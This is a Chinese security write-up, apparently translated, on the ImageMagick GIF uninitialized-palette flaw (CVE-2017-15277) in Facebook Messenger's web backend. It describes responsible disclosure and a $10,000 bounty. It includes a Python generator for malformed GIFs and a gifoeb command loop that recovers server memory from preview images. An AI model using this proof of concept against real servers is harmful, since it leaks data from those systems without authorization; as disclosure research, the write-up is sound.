***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **![messenger-header.jpg](https://image.3001.net/images/20190308/1552029385_5c8216c9e6e41.jpg!small)**
**本文分享的是Facebook
Messenger网页版本的ImageMagick漏洞（CVE-2017–15277），虽然是一个老洞，但也仍然存在于Facebook平台中。利用该漏洞可以间接导致服务器内存信息泄露，最终漏洞发现者获得了Facebook官方$10,000美金的奖励。**

## ImageMagick漏洞CVE-2017–15277介绍  

CVE-2017–15277最早于2017年10月被安全研究人员Emil
Lerner发现，它属于开源图像处理组件ImageMagick漏洞，受影响软件为ImageMagick 7.0.6–1和Graphicsmagick
1.3.26。原因在于，当ImageMagick在处理不具备全局或本地调色板的GIF图片时，ImageMagick
7.0.6–1和Graphicsmagick
1.3.26中存在未初始化的调色板，其coders/gif.c文件中ReadGIFImage存在安全漏洞，如果攻击者利用ReadGIFImage来处理GIF图片，构造操作，可以通过未初始化的调色板来间接获取到服务器中的内存数据信息。

简单地说就是，如果服务器中部署了ImageMagick 7.0.6–1和Graphicsmagick
1.3.26，且其中具备未初始化的调色板机制，那么，利用CVE-2017–15277，通过构造图片文件，上传至服务器中的任何可上传地方，之后，服务器通过处理这种构造图片，就会利用未初始化的调色板机制，把其转化成不同的图片预览文件，而在这些图片预览文件中，可能包含了一些和服务器内存相关的信息，如Stack
trace（堆栈跟踪）和String value（字符串值）信息等。

此外，从实际功能来说，ImageMagick是一个显示、转换和编辑光栅图像和矢量图像文件的开源软件，它被用于许多web应用中的裁剪、调整大小和改变颜色功能，且支持多种图像格式。

## 漏洞发现思路

2018年2月，我在测试Facebook Messenger
的安卓应用APP，研究它对一些损坏GIF图片的处理机制。受ImageMagick漏洞（CVE-2017–15277）“gif编码器中未初始化的内存泄露”的启发，也正好看到了俄罗斯研究人员发布的对应的[漏洞利用工具
- "gifoeb"](https://github.com/neex/gifoeb)。之后，我经测试发现，Facebook Messenger
在处理用gifoeb生成的空指针解引用(Nullpointer
Dereferrence)类图片时，APP程序会发生崩溃，而Facebook官方并不接收这种APP应用类的拒绝服务类漏洞。后来，我就想继续深入研究一下Facebook
Messenger 对GIF格式的处理机制，以及GIF图片的生成方式。

### 基本的GIF图片格式

经过查找，我了解了GIF图片的基本格式，其主要的格式头如下：

    
    
    Offset   Length   Contents
      0      3 bytes  "GIF"
      3      3 bytes  "87a" or "89a"
      6      2 bytes  <Logical Screen Width>
      8      2 bytes  <Logical Screen Height>
     10      1 byte   bit 0:    Global Color Table Flag (GCTF)
                      bit 1..3: Color Resolution
                      bit 4:    Sort Flag to Global Color Table
                      bit 5..7: Size of Global Color Table: 2^(1+n)
     11      1 byte   <Background Color Index>
     12      1 byte   <Pixel Aspect Ratio>
     13      ? bytes  <Global Color Table(0..255 x 3 bytes) if GCTF is one>
             ? bytes  <Blocks>
             1 bytes  <Trailer> (0x3b)

你也可以[点此参考详细的GIF图片格式说明](http://www.onicos.com/staff/iz/formats/gif.html#header)。之后，我决定用最少的必填字段生成一些简单的GIF图片。

### 生成GIF图片

我用Python写了个GIF生成脚本，如下：

    
    
    import struct
    screenWidth = 640
    screenHeight = 480
    f = open('test.gif', 'wb')
    # Offset   Length   Contents
    #   0      3 bytes  "GIF"
    #   3      3 bytes  "87a" or "89a"
    f.write(b"GIF89a")
    #   6      2 bytes  <Logical Screen Width>
    f.write(struct.pack('<h', screenWidth))
    #   8      2 bytes  <Logical Screen Height>
    f.write(struct.pack('<h', screenHeight))
    #  10      1 byte   bit 0:    Global Color Table Flag (GCTF)
    #                   bit 1..3: Color Resolution
    #                   bit 4:    Sort Flag to Global Color Table
    #                   bit 5..7: Size of Global Color Table: 2^(1+n)
    bits = int('00000010', 2)
    f.write(struct.pack('<b', bits))
    #  11      1 byte   <Background Color Index>
    f.write(struct.pack('<b', 0))
    #  12      1 byte   <Pixel Aspect Ratio>
    f.write(struct.pack('<b', 1))
    #  13      ? bytes  <Global Color Table(0..255 x 3 bytes) if GCTF is one>
    #          ? bytes  <Blocks>
    # Offset   Length   Contents
    #   0      1 byte   Image Separator (0x2c)
    f.write(struct.pack('<b', 0x2c))
    #   1      2 bytes  Image Left Position
    f.write(struct.pack('<h', 0))
    #   3      2 bytes  Image Top Position
    f.write(struct.pack('<h', 0))
    #   5      2 bytes  Image Width
    f.write(struct.pack('<h', screenWidth))
    #   7      2 bytes  Image Height
    f.write(struct.pack('<h', screenHeight))
    #   8      1 byte   bit 0:    Local Color Table Flag (LCTF)
    #                   bit 1:    Interlace Flag
    #                   bit 2:    Sort Flag
    #                   bit 2..3: Reserved
    #                   bit 4..7: Size of Local Color Table: 2^(1+n)
    #          ? bytes  Local Color Table(0..255 x 3 bytes) if LCTF is one
    f.write(struct.pack('<b', int('00000100', 2)))
    #          1 byte   LZW Minimum Code Size
    #f.write(struct.pack('<b', 1))
    # [ // Blocks
    #          1 byte   Block Size (s)
    #f.write(struct.pack('<b', 1))
    #         (s)bytes  Image Data
    # ]*
    #          1 byte   Block Terminator(0x00)
    #f.write(struct.pack('<b', 0))
    #          1 bytes  <Trailer> (0x3b)
    f.write(struct.pack('<b', 0x3b))
    f.close()

利用这个脚本，就可以生成我们想要的GIF图片了，其中包含了图片内容、大小、位置等简单属性设置。通过我的注释可以看出，我未填充任何GIF图片数据，所以在Color
Table尾部后的这个Image Data块是空的。

## 测试Facebook Messenger

利用上述生成脚本，我生成了各种不同大小、头部字段和像素的图片，但是这些所有图片的Image Data块都是空的。之后，我开始把它们在Facebook
Messenger的安卓APP上进行测试，但是，但是，什么异常都没有，#$&^%$()&@。哦，好吧，那我去试试Facebook
Messenger的网页版吧。

登录Facebook Messenger网页版的方式为，在下方网页进行登录：

![Facebook
Messenger网页版ImageMagick漏洞](https://image.3001.net/images/20190308/1552028895_5c8214dfc09a6.jpg!small)

登录之后，可以在以下红框内和好友进行信息发送：

![Facebook
Messenger网页版ImageMagick漏洞](https://image.3001.net/images/20190308/1552028970_5c82152a2e223.jpg!small)现在，我就给我的测试账号发了上述生成图片中的一张，发送出去后，图片的样子有点奇怪：  

![Facebook
Messenger网页版ImageMagick漏洞](https://image.3001.net/images/20190308/1552029011_5c8215537b424.gif!small)等等，我们的图片不是没什么数据内容吗？怎么，Facebook
Messenger网页版后端的解析有点异常。于是，我又马上换了另外一个尺寸的图片进行发送，咦，还有有些问题，它被解析为了一张白噪声图片：

![Facebook
Messenger网页版ImageMagick漏洞](https://image.3001.net/images/20190308/1552029052_5c82157c7b4a9.jpg!small)接着，我又重新选择了同一张图片进行发送，这次，Messenger后端解析出的图片和上一次相比，又有一些小小的不同：

![Facebook
Messenger网页版ImageMagick漏洞](https://image.3001.net/images/20190308/1552029069_5c82158d8635c.jpg!small)经过不同尺寸的GIF图片测试发送之后，Messenger后端解析出了一张信号比较稳定的全屏图片：

![Facebook
Messenger网页版ImageMagick漏洞](https://image.3001.net/images/20190308/1552029088_5c8215a05c8e8.jpg!small)最终，反复的测试发送后，Messenger后端还解析出了相对稳定的图片：

![Facebook
Messenger网页版ImageMagick漏洞](https://image.3001.net/images/20190308/1552029114_5c8215bae8386.jpg!small)后来，我发现，为什么每次的图片发送，Messenger后端都会有不同的解析结果，原因是因为我原本生成的图片中没有包含任何内容，因此，Messenger后端会利用调色板机制，把每张图片进行随机的预览处理，所以每次的发送图片都会有不同的解析预览效果，也就是说，在这些Messenger后端生成的解析预览图片中，就包含了Messenger后端服务器的某些信息。（PS：其实文中作者各种不同大小、头部字段或像素的GIF图片生成，也可以用CVE-2017–15277利用工具gifoeb来完成，具体参考
[gifoeb的Github页面](https://github.com/neex/gifoeb)）。

以下为每次图片发送后的Messenger后端解析效果视频：

看不到？点[这里](https://v.qq.com/x/page/p0848grhi8j.html)

## 内存信息泄露

有了这些Messenger后端生成的解析预览图片，我们可以把它们保存在本地，利用CVE-2017–15277利用工具gifoeb，通过执行以下命令：

    
    
    for p in previews/*; do
        ./gifoeb recover $p | strings;
      done

![1_j3BKI0ufMWTRklihhvBJDg.jpeg](https://image.3001.net/images/20190308/1552029258_5c82164a96895.jpeg!small)就能从这些图片中提取出Messenger后端服务器的内存信息，文中作者省略了最终的这一步，大家可以参考《[HackerOne平台ImageMagick漏洞导致服务器内存信息泄露](https://www.freebuf.com/vuls/189776.html)》体会最终的内存信息泄露效果。

## 漏洞修复进程

> 2018.2.26 漏洞初报
>
> 2018.3.1 漏洞分类
>
> 2018.3.9 漏洞修复
>
> 2018.3.21 Facebook向我奖励了$10000美金

 ***参考来源：[vulnano](https://www.vulnano.com/2019/03/facebook-messenger-server-random-memory.html)，clouds编译，转载请注明来自FreeBuf.COM**  

